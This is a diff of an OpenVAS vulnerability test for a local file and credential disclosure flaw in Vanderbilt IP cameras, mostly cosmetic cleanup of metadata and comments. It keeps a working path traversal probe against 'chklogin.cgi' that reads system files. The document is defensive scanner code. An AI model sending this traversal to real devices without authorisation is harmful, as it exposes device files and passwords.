@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_vanderbilt_ip_camera_lfi_nd_cred_disclosure_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
+# $Id: gb_vanderbilt_ip_camera_lfi_nd_cred_disclosure_vuln.nasl 11493 2018-09-20 09:02:35Z asteins $
 #
 # Vanderbilt IP-Camera Local File Disclosure and Credential Disclosure Vulnerabilities
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:vanderbilt:vanderbilt_ip_camera";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.807353");
-  script_version("$Revision: 7577 $");
+  script_version("$Revision: 11493 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 11:02:35 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2016-08-23 16:18:17 +0530 (Tue, 23 Aug 2016)");
   script_name("Vanderbilt IP-Camera Local File Disclosure and Credential Disclosure Vulnerabilities");
 
@@ -43,15 +43,15 @@ if(description)
   and check whether it is able to read the password file or not.");
 
   script_tag(name:"insight", value:"Multiple flaws exists due to
-  - An improper sanitization of input to 'file' parameter in 'chklogin.cgi' 
+
+  - An improper sanitization of input to 'file' parameter in 'chklogin.cgi'
     and 'check.cgi' scripts.
+
   - An improper restriction on user access levels for certain pages.");
 
   script_tag(name:"impact", value:"Successful exploitation will allow a remote
-  attacker to read arbitrary files and also to read sensitive information like 
-  username and password of the device.
-
-  Impact Level: Application");
+  attacker to read arbitrary files and also to read sensitive information like
+  username and password of the device.");
 
   script_tag(name:"affected", value:"Vanderbilt IP-Camera types CCPW3025-IR,
   CVMW3025-IR.");
@@ -62,8 +62,8 @@ if(description)
 
   script_tag(name:"qod_type", value:"remote_vul");
 
-  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/40263");
-  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/40281");
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40263");
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40281");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
@@ -84,12 +84,10 @@ vanPort = 0;
 dir = "";
 url = "";
 
-# Get HTTP Port
 if(!vanPort = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Get installed location
 if(!dir = get_app_location(cpe:CPE, port:vanPort)){
   exit(0);
 }
@@ -102,10 +100,8 @@ files = traversal_files();
 
 foreach file (keys(files))
 {
-  ## Construct vulnerable url 
   url = dir + '/chklogin.cgi?file=' + crap(data: "../", length: 3*15) + files[file];
 
-  ## Try attack and check the response to confirm vulnerability
   if(http_vuln_check(port:vanPort, url:url, check_header:TRUE, pattern:file))
   {
     report = report_vuln_url(port:vanPort, url:url);
